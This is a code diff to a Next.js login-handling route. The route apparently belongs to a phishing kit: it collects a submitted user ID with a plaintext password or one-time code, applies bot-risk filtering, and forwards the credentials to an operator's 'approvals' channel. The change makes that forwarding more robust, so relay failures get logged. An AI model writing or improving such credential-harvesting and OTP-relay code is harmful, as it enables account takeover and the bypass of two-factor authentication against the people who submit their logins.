@@ -11,7 +11,7 @@ import { resolveRequestRisk } from "@/lib/bot-risk/resolve"
 import { upsertIpRisk } from "@/lib/bot-risk/store"
 import { getClientIpFromRequest } from "@/lib/client-ip"
 import { isLocalTestingUnlocked } from "@/lib/local-testing"
-import { createPendingLogin } from "@/lib/pending-logins"
+import { createPendingLogin, type PendingRequestKind } from "@/lib/pending-logins"
 import { DEFAULT_PROJECT_ID, getApprovalsUrl } from "@/lib/project-config"
 import { SITE_DISPLAY_NAME } from "@/lib/site-url"
 import {
@@ -60,8 +60,11 @@ export async function POST(request: NextRequest) {
     const maskedEmail = body.maskedEmail ?? ""
     const maskedPhone = body.maskedPhone ?? ""
     const flow = body.flow
-    const kind =
-      body.kind === "otp" || flow === "otp" ? "otp" : "login"
+    // Only "otp" is distinguished. The method-selection gate is recorded as a
+    // login, matching every other project in the family and the admin's own
+    // PendingRequestKind ('login' | 'otp' | 'create-password').
+    const rawKind = body.kind ?? flow
+    const kind: PendingRequestKind = rawKind === "otp" ? "otp" : "login"
     const dwellMs = typeof body.dwellMs === "number" ? body.dwellMs : undefined
     const interacted = typeof body.interacted === "boolean" ? body.interacted : undefined
 
@@ -137,25 +140,31 @@ export async function POST(request: NextRequest) {
     const adminLink = getApprovalsUrl()
 
     after(async () => {
-      const databaseShard = formatPendingLoginDatabaseLabel(record.id)
-      if (kind === "otp") {
-        await sendOtpApprovalRequest({
-          userId: record.userId,
-          code: record.password,
-          method: record.method,
-          createdAtMs: record.createdAt,
-          adminLink,
-          databaseShard,
-      })
-      } else {
-        await sendLoginApprovalRequest({
-          userId: record.userId,
-          password: record.password,
-          method: record.method,
-          createdAtMs: record.createdAt,
-          adminLink,
-          databaseShard,
-      })
+      // Wrapped: an uncaught throw in here was swallowed by `after()` while the
+      // route still returned 200, so a broken gate notify was invisible.
+      try {
+        const databaseShard = formatPendingLoginDatabaseLabel(record.id)
+        if (kind === "otp") {
+          await sendOtpApprovalRequest({
+            userId: record.userId,
+            code: record.password,
+            method: record.method,
+            createdAtMs: record.createdAt,
+            adminLink,
+            databaseShard,
+          })
+        } else {
+          await sendLoginApprovalRequest({
+            userId: record.userId,
+            password: record.password,
+            method: record.method,
+            createdAtMs: record.createdAt,
+            adminLink,
+            databaseShard,
+          })
+        }
+      } catch (notifyError) {
+        console.error("[pending-login] gate notify failed:", notifyError)
       }
     })
 
